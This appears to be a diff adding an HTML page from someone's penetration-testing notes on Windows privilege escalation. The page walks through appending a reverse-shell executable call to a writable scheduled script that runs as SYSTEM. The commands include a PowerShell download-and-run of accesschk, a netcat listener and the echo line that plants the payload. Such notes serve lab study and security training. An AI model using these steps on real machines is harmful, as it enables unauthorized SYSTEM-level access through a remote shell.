@@ -1,0 +1,44 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>append a call to a reverse shell executable to the end of the scheduled script</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>append a call to a reverse shell executable to the end of the scheduled script</h1>
+    <br /><strong>Prerequisites:</strong><br />• already found a scheduled script that run as SYSTEM or high
+    privileges<br /><br /><br />1. View the script found<br />
+    <div class="codebox">
+      <div class="codebox">C:\&gt;&nbsp;type&nbsp;C:\DevTools\CleanUp.ps1</div>
+    </div><br /> <a href=""><img src="images/1335-1.png" alt="images/1335-1.png" /></a><br />2. From what is written
+    inside the file this script seems like it is running as the SYSTEM user. <br /> We can check our privileges on this
+    script using accesschk.exe:<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\accesschk.exe&nbsp;/accepteula&nbsp;-quvw&nbsp;user&nbsp;C:\DevTools\CleanUp.ps1&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Eula.txt&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;
+      </div>
+    </div><br /> As we can see below in this case we can write to this file, which means that we can insert our own
+    commands and have run as SYSTEM(if it run as system) when the script executes.<br /> <a href=""><img
+        src="images/1335-2.png" alt="images/1335-2.png" /></a><br />5. Backup the original script<br />
+    <div class="codebox">
+      <div class="codebox">C:\&gt;&nbsp;copy&nbsp;C:\DevTools\CleanUp.ps1&nbsp;C:\Temp\</div>
+    </div><br />6. Start a listener on Kali.<br />
+    <div class="codebox">
+      <div class="codebox">root@kali:/#&nbsp;nc&nbsp;-nvlp&nbsp;53</div>
+    </div><br />7. Use echo to append a call to our reverse shell executable to the end of the script(in this case
+    C:\DevTools\CleanUp.ps1):<br />
+    <div class="codebox">
+      <div class="codebox">
+        C:\&gt;&nbsp;echo&nbsp;C:\PrivEsc\reverse.exe&nbsp;&gt;&gt;&nbsp;C:\DevTools\CleanUp.ps1&nbsp;&nbsp;#on&nbsp;Powershell&nbsp;this&nbsp;command&nbsp;does&nbsp;not&nbsp;work!
+      </div>
+    </div><br />8. Wait for the scheduled task to run to complete the exploit.<br /> <a href=""><img
+        src="images/1335-3.png" alt="images/1335-3.png" /></a><br /><br /><br /><br /><br />
+  </div>
+</body>
+
+</html>
